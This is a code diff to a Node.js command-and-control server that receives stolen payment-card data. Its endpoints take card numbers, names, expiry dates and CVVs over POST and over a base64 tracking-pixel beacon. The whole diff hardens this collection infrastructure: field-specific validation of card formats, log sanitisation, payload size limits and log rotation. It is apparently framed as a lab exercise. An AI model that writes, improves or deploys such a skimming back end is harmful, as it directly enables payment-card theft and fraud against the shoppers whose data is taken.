@@ -32,14 +32,47 @@ const apiLimiter = rateLimit({
 })
 const DATA_DIR = path.join(__dirname, 'stolen-data')
 
-// Allowed fields and max lengths for input validation
-const ALLOWED_FIELDS = ['card_number', 'card_name', 'expiry', 'cvv', 'source']
-const MAX_FIELD_LENGTH = 256
+// Field-specific validation rules
+const VALIDATION_RULES = {
+  card_number: { regex: /^[0-9\s-]{15,19}$/, maxLength: 20 },
+  card_name: { regex: /^[a-zA-Z\s'.]{2,100}$/, maxLength: 100 },
+  expiry: { regex: /^(0[1-9]|1[0-2])\/?([0-9]{2}|[0-9]{4})$/, maxLength: 10 },
+  cvv: { regex: /^[0-9]{3,4}$/, maxLength: 4 },
+  source: { regex: /^[a-zA-Z0-9-]{1,50}$/, maxLength: 50 }
+}
 
-// Sanitize a string: strip control characters, limit length
-function sanitizeField(value) {
+const ALLOWED_FIELDS = Object.keys(VALIDATION_RULES)
+
+// Sanitize a string: strip control characters and dangerous escape/injection characters
+function sanitizeField(value, fieldName) {
   if (value === undefined || value === null) return undefined
-  return String(value).replace(/[\x00-\x1f\x7f]/g, '').slice(0, MAX_FIELD_LENGTH)
+
+  const rule = VALIDATION_RULES[fieldName]
+  const maxLen = rule ? rule.maxLength : 256
+
+  let str = String(value)
+    // 1. Strip control characters
+    .replace(/[\x00-\x1f\x7f]/g, '')
+    // 2. Tightly restrict characters to prevent escape sequences/RCE (no backslashes, quotes, backticks)
+    .replace(/[\\"'`<>]/g, '')
+    // 3. Enforce length limit
+    .slice(0, maxLen)
+    .trim()
+
+  // 4. Regex validation for specific fields
+  if (rule && rule.regex && !rule.regex.test(str)) {
+    console.warn(`[C2] ⚠️  Validation failed for field: ${fieldName} ("${str}")`)
+    return undefined // Drop invalid data
+  }
+
+  return str || undefined
+}
+
+// Dedicated helper for log-safe strings (replaces newlines with spaces)
+function sanitizeForLog(value) {
+  const sanitized = sanitizeField(value)
+  if (!sanitized) return 'N/A'
+  return String(sanitized).replace(/[\r\n]/g, ' ').trim() || 'N/A'
 }
 
 // Sanitize request body: only keep allowed fields, sanitize values
@@ -47,7 +80,10 @@ function sanitizeBody(raw) {
   const clean = {}
   for (const key of ALLOWED_FIELDS) {
     if (raw[key] !== undefined) {
-      clean[key] = sanitizeField(raw[key])
+      const sanitized = sanitizeField(raw[key], key)
+      if (sanitized !== undefined) {
+        clean[key] = sanitized
+      }
     }
   }
   return clean
@@ -75,9 +111,9 @@ app.post('/collect', collectLimiter, async (req, res) => {
   const body = sanitizeBody(rawBody)
 
   // Safe logging (prevent log injection)
-  const safeCardNumber = String(body.card_number || 'N/A').replace(/[\r\n]/g, ' ')
-  const safeName = String(body.card_name || 'N/A').replace(/[\r\n]/g, ' ')
-  const safeSource = String(body.source || 'unknown').replace(/[\r\n]/g, ' ')
+  const safeCardNumber = sanitizeForLog(body.card_number)
+  const safeName = sanitizeForLog(body.card_name)
+  const safeSource = sanitizeForLog(body.source || 'unknown')
 
   console.log(`\n[C2] 🎯 Stolen data received at ${ts}`)
   console.log(`[C2]   Card: ${safeCardNumber}`)
@@ -88,7 +124,7 @@ app.post('/collect', collectLimiter, async (req, res) => {
     id: `stego-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
     timestamp: ts,
     ip: req.ip || req.connection.remoteAddress,
-    userAgent: sanitizeField(req.get('user-agent')),
+    userAgent: String(req.get('user-agent') || '').replace(/[\x00-\x1f\x7f\\"'`<>]/g, '').slice(0, 512),
     data: body  // sanitized body only
   }
 
@@ -102,14 +138,16 @@ app.post('/collect', collectLimiter, async (req, res) => {
   // Append to master log (with rotation)
   try {
     const logPath = path.join(DATA_DIR, 'master-log.jsonl');
-    
+
     // Check log size and rotate if > 5MB
+    // NOTE: In high-concurrency environments, fs.stat+fs.rename has a race condition.
+    // Since this is a lab, the try-catch ensures we don't crash if rename fails.
     try {
       const stats = await fs.stat(logPath);
       if (stats.size > 5 * 1024 * 1024) {
         await fs.rename(logPath, logPath + '.bak');
       }
-    } catch (e) { /* ignore if new file */ }
+    } catch (e) { /* ignore if new file or rename failed due to race */ }
 
     await fs.appendFile(
       logPath,
@@ -125,22 +163,37 @@ app.post('/collect', collectLimiter, async (req, res) => {
 // ──────────────────────────────────────────────────
 app.get('/collect', collectLimiter, async (req, res) => {
   if (req.query.d) {
-    try {
-      await ensureDataDir()
-      const decoded = Buffer.from(req.query.d, 'base64').toString('utf8')
-      const parsed = JSON.parse(decoded)
-      // Sanitize decoded data before writing to disk
-      const sanitizedData = sanitizeBody(parsed)
-      const record = {
-        id: `beacon-${Date.now()}`,
-        timestamp: new Date().toISOString(),
-        data: sanitizedData
-      }
-      await fs.writeFile(
-        path.join(DATA_DIR, `${record.id}.json`),
-        JSON.stringify(record, null, 2)
-      )
-    } catch (e) { /* silent */ }
+    // Basic size validation for base64 payload (10KB limit)
+    if (req.query.d.length > 10240) {
+      console.warn(`[C2] ⚠️  Rejected oversized beacon payload (${req.query.d.length} bytes)`)
+    } else {
+      try {
+        await ensureDataDir()
+        const decoded = Buffer.from(req.query.d, 'base64').toString('utf8')
+
+        // Ensure decoded data is valid JSON
+        let parsed;
+        try {
+          parsed = JSON.parse(decoded)
+        } catch (je) {
+          console.warn('[C2] ⚠️  Invalid JSON in beacon payload')
+        }
+
+        if (parsed) {
+          // Sanitize decoded data before writing to disk
+          const sanitizedData = sanitizeBody(parsed)
+          const record = {
+            id: `beacon-${Date.now()}`,
+            timestamp: new Date().toISOString(),
+            data: sanitizedData
+          }
+          await fs.writeFile(
+            path.join(DATA_DIR, `${record.id}.json`),
+            JSON.stringify(record, null, 2)
+          )
+        }
+      } catch (e) { /* silent */ }
+    }
   }
   // Return 1x1 transparent GIF
   const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64')
